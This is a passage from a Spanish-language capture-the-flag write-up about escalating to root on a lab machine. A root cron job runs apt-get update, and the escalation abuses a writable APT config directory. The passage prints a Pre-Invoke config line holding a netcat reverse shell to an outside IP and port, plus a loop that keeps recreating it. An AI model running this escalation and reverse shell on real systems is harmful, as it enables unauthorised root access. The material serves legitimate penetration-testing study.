Una carpeta (parece), validemos:

```bash
john@writer:~$ cat /etc/apt/apt.conf.d
cat: /etc/apt/apt.conf.d: Is a directory
john@writer:~$ ls -la /etc/apt/apt.conf.d
total 48
drwxrwxr-x 2 root management 4096 Oct 14 16:56 .
drwxr-xr-x 7 root root       4096 Jul  9 10:59 ..
-rw-r--r-- 1 root root        630 Apr  9  2020 01autoremove
-rw-r--r-- 1 root root         92 Apr  9  2020 01-vendor-ubuntu
-rw-r--r-- 1 root root        129 Dec  4  2020 10periodic
-rw-r--r-- 1 root root        108 Dec  4  2020 15update-stamp
-rw-r--r-- 1 root root         85 Dec  4  2020 20archive
-rw-r--r-- 1 root root       1040 Sep 23  2020 20packagekit
-rw-r--r-- 1 root root        114 Nov 19  2020 20snapd.conf
-rw-r--r-- 1 root root        625 Oct  7  2019 50command-not-found
-rw-r--r-- 1 root root        182 Aug  3  2019 70debconf
-rw-r--r-- 1 root root        305 Dec  4  2020 99update-notifier
```

Jmmm, una b√∫squeda r√°pida del nombre del directorio por internet nos lleva a esta respuesta de [este hilo](https://askubuntu.com/questions/254137/etc-apt-apt-conf-d-priority-overrule-configuration-file#answer-254617):

üîß ***Each directory represents a configuration file which is split over multiple files. In this sense, all of the files in `/etc/apt/apt.conf.d/` are instructions for the <u>configuration of APT.</u> <u>APT includes them in alphabetical order, so that the last ones can modify a configuration element defined in one of the first ones.</u>***. [/etc/apt/apt.conf.d/](https://askubuntu.com/questions/254137/etc-apt-apt-conf-d-priority-overrule-configuration-file#answer-254617)

Yyyy ¬øqu√© es **APT**?

üéÅ ***Advanced Packaging Tool (APT): Programa de gesti√≥n de paquetes creado por el proyecto Debian. APT simplifica en gran medida la instalaci√≥n y eliminaci√≥n de programas en los sistemas GNU/Linux.*** [Advanced Package Tool (APT)](https://es.wikipedia.org/wiki/Advanced_Packaging_Tool)

Lo usamos cuando hacemos `apt-get install ...` o `apt update` y muuuchas m√°s opciones, pero para que sepan de qu√© hablamos.

Liiiisto, ya sabiendo que es eso, nos queda saber el porqu√© tenemos acceso a esos archivos de configuraci√≥n. Algo que encontramos en internet es que (como dije antes) todas las configuraciones son "instaladas" o "ejecutadas" al usar el comando `apt` o `apt-get` o `apt..`, podr√≠amos pensar en generar una configuraci√≥n maliciosa para posteriormente ejecutar `apt...`, pero claro, no tenemos permisos suficientes para usar esas herramientas :/

PEEEEEEEEERO podemos pensar que alg√∫n administrador en alg√∫n momento va a ejecutar `apt-get ...` o `apt update` para instalar paquetes o actualizarlos, **lo que √©l no sabr√≠a** es que nosotros tendr√≠amos una configuraci√≥n maliciosa esperando a ser ejecutada ü•µ

Lo m√°s seguro es que por ac√° sea la manera de elevar privilegios.

Como personitas que jugamos en entornos **simulados**, no podemos esperar a que realmente un **admin** ejecute `apt-get ...` o `apt update`, tenemos que pensar en ello como tareas programadas que ha dejado el creador de la m√°quina **simulando** que las hace un **admin**. Si queremos validar si existe esa tarea programada podemos apoyarnos de [pspy](https://github.com/DominicBreuker/pspy), ya que √©l monitorea en el sistema distintos procesos que se est√©n llevando a cabo sea el usuario que sea.

Lo descargamos, lo subimos a la m√°quina y ejecutamos:

```bash
john@writer:/tmp/tset$ chmod +x pspy 
john@writer:/tmp/tset$ ./pspy
```

En su ejecuci√≥n vemos muuuuchas de las tareas con las que hemos interactuado, pero prestando atenci√≥n vemos esto:

(Recuerden, buscamos procesos llevados a cabo por el usuario `root`, √©l tiene el **UID** (User ID) `0`)

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361bash_johnSH_pspy_aptTASKS.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Y s√≠, ah√≠ vemos la ejecuci√≥n por parte de `root` en la instrucci√≥n, peeeeeeero si analizamos un poco el output, vemos que probablemente debamos ser r√°pidos, ¬øya vieron por qu√©?

Antes de ejecutar el:

```bash
/usr/bin/apt-get update
```

Borra todo lo que se ha creado en las √∫ltimas **24 horas** ([-mtime](https://stackoverflow.com/questions/25599094/explaining-the-find-mtime-command)), as√≠ que si creamos nuestro objeto de configuraci√≥n, claramente ser√° borrado, esto lo podemos bypassear haciendo un bucle, donde en cada segundo cree el archivo de configuraci√≥n, entonces el `find` llegara a borrarlo peeeeero inmediatamente el bucle lo creara y `apt-get update` lo e j e c u t a r √° (:

As√≠√≠√≠√≠√≠√≠ queeeeeeeee, busquemos en internet como jugar realmente con estoooooooooaosoOOoasdjflkajsdl√±kgjlakhs

* [Linux for Pentester: APT Privilege Escalation](https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/).

En ese post hay varias maneras, pero la que nos sirve a nosotros es la que explota una tarea **cron** (que eso es lo que tenemos nosotros, una tarea programada), la explotaci√≥n es muuuuuuuy sencilla, √∫nicamente creamos un archivo de configuraci√≥n que tenga el comando a ejecutar, b√°sicamente una l√≠nea (:

Por ejemplo usando la propia del post (que es para obtener una reverse shell con `nc` viejito) el archivo se llamar√≠a `pwn` y contendr√≠a:

```bash
echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 4433 >/tmp/f"};' > pwn
```

Pues cre√©moslo, nos ponemos en escucha por el puerto `4433` y esperamos a que la tarea cron sea ejecutada, borrara el objeto `pwn`, peeeero con ayuda de nuestro bucle lo volver√° a crear y posteriormente el sistema actualizara los paquetes, llegando as√≠ al nuestro (:

```bash
john@writer:/etc/apt/apt.conf.d$ while true; do echo 'apt::Update::Pre-Invoke {"rm ... payload ... /tmp/f"};' > pwn; sleep 1; done
```

Esperamos un rato yyyyyyyyyyyyyyy:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361bash_rootRevSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

YYYYY TAMOSSS DENTROOO COMO `ROOOOOOOOT` (: Veamos las flags...

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writer/361flags.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

...

Una m√°quina bastante interesante, la intrusi√≥n con el **LFI** mediante un **SQLi**, fue mooooooy brutal. La parte de **APT** tambi√©n da mucho que pensar (que miedito).

Writeup realmente largo, pero que me divert√≠ bastante al hacer. Espero les haya ayudado en algo y como siempre... ¬°A seguir rompiendo deeeeee todoooooooo!